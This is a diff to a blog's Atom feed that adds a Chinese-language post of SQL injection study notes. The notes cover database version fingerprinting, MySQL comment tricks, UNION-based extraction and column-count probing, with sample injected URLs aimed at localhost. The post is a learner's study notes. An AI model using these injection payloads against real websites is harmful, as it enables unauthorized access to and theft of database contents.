@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://loid.online/"/>
-  <updated>2017-03-28T16:31:33.325Z</updated>
+  <updated>2017-04-10T20:04:05.468Z</updated>
   <id>http://loid.online/</id>
   
   <author>
@@ -14,6 +14,113 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SQL Injection Study</title>
+    <link href="http://loid.online/2017/04/11/SQL-Injection-Study/"/>
+    <id>http://loid.online/2017/04/11/SQL-Injection-Study/</id>
+    <published>2017-04-10T19:01:01.000Z</published>
+    <updated>2017-04-10T20:04:05.468Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="SQL注入攻击学习笔记"><a href="#SQL注入攻击学习笔记" class="headerlink" title="SQL注入攻击学习笔记"></a>SQL注入攻击学习笔记</h2><hr>
+<ul>
+<li><p>[非盲跟踪] 在返回各种数据库服务器时对应的查询</p>
+<pre><code>    数据库服务器                查 询
+Microsoft SQL Server        SELECT @@version
+    MySQL                   SELECT version()
+                            SELECT @@version
+    Oracle                  SELECT banner FROM v$version
+                            SELECT banner FROM v$version WHERE rownum=1
+    PostgreSQL              SELECT version()
+</code></pre></li>
+<li><p>[盲跟踪]从字符串推断数据库服务版本</p>
+<pre><code>    数据库服务器                查询
+Microsoft SQL Server        SELECT &apos;some&apos;+&apos;string&apos;
+    MySQL                   SELECT &apos;some&apos; &apos;string&apos;
+                            SELECT CONCAT(&apos;some&apos;,&apos;string&apos;)
+    Oracle                  SELECT &apos;some&apos;||&apos;string&apos;
+                            SELECT CONCAT(&apos;some&apos;,&apos;string&apos;)
+    PostgreSQL              SELECT &apos;some&apos;||&apos;string&apos;
+                            SELECT CONCAT(&apos;some&apos;,&apos;string&apos;)
+</code></pre></li>
+<li><p>[盲跟踪]从数字函数推断数据库服务器版本</p>
+<pre><code>    数据库服务器                查询
+Microsoft SQL Server        @@pack_recevived
+                            @@rowcount
+    MySQL                   connection_id()
+                            last_insert_id()
+                            row_count()
+    Oracle                  BITAND(1,1)
+    PostgreSQL              SELECT EXTRACT(DOW FROM NOW())
+</code></pre></li>
+<li><p>关于MySQL的注释</p>
+<ul>
+<li>在尾行加一个#</li>
+<li>在尾行加一个 “– “ 序列,注意第二个连接字符后面有个空格!!!</li>
+<li>在一个 “/<em>“ 序列后再跟一个”</em>/“ 序列,两者之间的就是注释。</li>
+<li>关于第三条的追加说明: 如果在注释开头添加一个感叹号,并在后面跟上数据库版本编号,那么改代码将被解析成代码.<pre><code>只要安装的数据库版本高于或等于注释中包含的数据库版本,代码就会执行.例如
+SELECT 1 /*!40119 + 1*/
+返回的两个结果情况:
+    - 2(如果MySQL的版本为4.01.19 或更高版本)
+    - 1(其他情况)
+</code></pre></li>
+</ul>
+</li>
+<li><p>使用UNION语句提取数据</p>
+<ul>
+<li>用以拼接多个查询语句: <pre><code>SELECT column-1,column-2,... FROM tabele-1 
+UNION 
+SELECT column-1,column-2,... FROM table-2
+</code></pre></li>
+<li>默认情况下,结果中只包含不同的值.如果想返回所有的数据,可以用UNION ALL<pre><code>SELECT column-1,column-2,... FROM table-1
+UNION ALL
+SELECT column-1,column-2,... FROM table-2
+</code></pre></li>
+</ul>
+</li>
+<li><p>匹配列</p>
+<ul>
+<li>在使用UNION查询数据的时候,必须满足 两个查询语句返回的列数是相同的(至少兼容),如果不满足的话,查询遍会返回一个错误</li>
+<li>查询正确列数的方法1：<pre><code>说明: 这里的NULL值会被转换成任何类型的数据
+http://127.0.0.1/products.asp?id=666+union+select+null-- 
+http://127.0.0.1/products.asp?id=666+union+select+null,null-- 
+http://127.0.0.1/products.asp?id=666+union+select+null,null,null--
+直到不返回错误为止
+</code></pre></li>
+<li>查询正确列数的方法2:<pre><code>使用ORDER BY 子句查询
++----------+----------+
+| username | password |
++----------+----------+
+| admin    | admin    |
+| LOid     | 123456   |
++----------+----------+
+关于ORDER BY 的简单说明:
+    select * from table-1 order by 1
+        等价于
+    select * from table-2 order by username
+    以 username 的数据为正序返回所有数据
+用ORDER BY 来查询列数
+    http://127.0.0.1/products.asp?id=666+order+by+1
+    http://127.0.0.1/products.asp?id=666+order+by+2
+    http://127.0.0.1/products.asp?id=666+order+by+3
+    如果第6个接受到了错误,就以为着查询中包含5个列
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<p>2017年04月11日04:03:02 睡觉了 mmp</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;SQL注入攻击学习笔记&quot;&gt;&lt;a href=&quot;#SQL注入攻击学习笔记&quot; class=&quot;headerlink&quot; title=&quot;SQL注入攻击学习笔记&quot;&gt;&lt;/a&gt;SQL注入攻击学习笔记&lt;/h2&gt;&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;[非盲跟踪] 在返回各种数据库服务器时对
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>WiFi Hacker for Web</title>
